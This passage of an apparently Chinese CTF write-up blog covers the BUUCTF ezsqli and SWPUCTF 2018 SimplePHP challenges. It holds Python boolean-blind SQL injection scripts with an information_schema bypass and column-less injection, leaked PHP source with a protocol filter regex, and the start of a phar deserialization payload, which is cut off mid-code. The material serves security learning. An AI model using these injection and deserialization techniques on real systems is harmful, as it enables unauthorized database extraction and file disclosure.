所以就是说可以使用bool盲注脚本来进行判断</p><p><img src="../images/image-20230710153420887.png" alt="image-20230710153420887"></p><p>刚好可以使用这来进行爆破</p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#buuctf web ezsqli</span></span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> right</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://8be76b70-3e62-4ed2-bddb-9a1f96815747.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">table_name = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    letf = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> letf &lt; right:</span><br><span class="line">        mid = (letf+right) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema = database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        res = requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            letf = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line">        table_name += <span class="built_in">chr</span>(letf)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="built_in">print</span>(table_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里的话因为这个<strong><code>information_schema.tables</code></strong>被过滤了</p><p><strong>(这也是个小知识点  可以记下积累)</strong></p><p>用<code>sys.x$schema_table_statistics_with_buffer</code>代替</p><p><a href="https://blog.csdn.net/qq_45521281/article/details/106647880">Bypass information_schema与无列名注入</a></p><p><strong>爆出了2张表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1ag_1s_h3r3_hhhhh,users233333333333333</span><br></pre></td></tr></table></figure><h3 id="这里考点是考察无列名注入"><a href="#这里考点是考察无列名注入" class="headerlink" title="这里考点是考察无列名注入"></a>这里考点是考察无列名注入</h3><p>因为过滤了很多东西  无法使用常规方法进行绕过</p><p><strong>这里的用到的是无列名的ascii位偏移方法</strong></p><p><img src="../images/image-20230710155521360.png" alt="image-20230710155521360"></p><p><strong>从这里来看的话可以得出结论就是这里比较的不是长度  而是比较ascii的大小</strong></p><p><strong>这道题我们利用的就是这个特性，我们首先会从构造一个ascii从32到128的循环，与flag字符诸位一一进行对比，满足条件返回Nu1L，输出符合条件的ascii对应的字符，也就是找到了flag的第一个字符，以此类推，直到输出flag所有位的字符。</strong></p><p><img src="../images/image-20230710160753037.png" alt="image-20230710160753037"></p><p>字母是代表0</p><p>所以说可以使用<code>1&amp;&amp;((1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code>来判断一共有几列</p><p><strong>返回 Nu1L，说明有两列。</strong></p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8e176081-905d-4063-a906-4eed1f03ed17.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">        py=payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        datas=&#123;<span class="string">&#x27;id&#x27;</span>:py&#125;</span><br><span class="line">        re=requests.post(url=url,data=datas)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们匹配flag的时候，一定会先经过匹配到字符相等的情况，这一这个时候返回的是0，对应题目中的V&amp;N，很明显此时的chr(char)并不是我们想要的，我们在输出1(Nu1L)的时候，匹配的是f的下一个字符g，而我们想要的是f，此时chr(char-1)=’f’，所以这里要用chr(char-1)</p><p><strong>然后将生成的flag转为小写就行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;FLAG&#123;FADF587F-8C6F-442B-A523-F220A4DB0690&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$lowercaseStr</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$lowercaseStr</span>;  <span class="comment">// 输出：hello world</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_45521281/article/details/106647880">Bypass information_schema与无列名注入</a></p><p>这篇文章写的很好  可以拿来学习一下</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>题目</p><p><img src="../images/image-20230710162041689.png" alt="image-20230710162041689"></p><p>有查看文件和上传文件两个点  但是这个查看文件后面跟着个<strong>?file</strong></p><p>于是就去尝试一下看是否能读取文件</p><p><img src="../images/image-20230710162236534.png" alt="image-20230710162236534"></p><p>依次把能读取的文件全读取出来</p><p><strong>file.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>base.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt; </span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span>&quot; <span class="title">role</span>=&quot;<span class="title">navigation</span>&quot;&gt; </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">fluid</span>&quot;&gt; </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt; </span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbra</span>-<span class="title">toggle</span>&quot;&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">file</span>.<span class="title">php</span>?<span class="title">file</span>=&quot;&gt;查看文件&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">upload_file</span>.<span class="title">php</span>&quot;&gt;上传文件&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">right</span>&quot;&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">glyphicon</span> <span class="title">glyphicon</span>-<span class="title">user</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SERVER</span>[&#x27;<span class="title">REMOTE_ADDR</span>&#x27;];?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt; </span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt; </span></span><br><span class="line"><span class="class">    &lt;/<span class="title">nav</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt; </span></span><br><span class="line"><span class="class">&lt;!--<span class="title">flag</span> <span class="title">is</span> <span class="title">in</span> <span class="title">f1ag</span>.<span class="title">php</span>--&gt;</span></span><br></pre></td></tr></table></figure><p><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的话给了上传文件的话  又加上没有反序列化的入口  那么我们就可以猜想到这个是个<strong>phar反序列化</strong></p><p>能实现这个的前提是得有<code>file_</code>开头的函数   并且存在恶意类  里面得存在一些能获取信息的函数</p><p>所以说 我们的思路是先去上传这个<strong>phar</strong>文件</p><p>然后在通过这个file协议访问</p><p><img src="../images/image-20230710204842754.png" alt="image-20230710204842754"></p><p>这里的话使用phar协议的话就可以触发phar反序列化了</p><ul><li><strong>第一步构造phar文件</strong></li></ul><p>(在存在恶意类的php文件下生成)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span 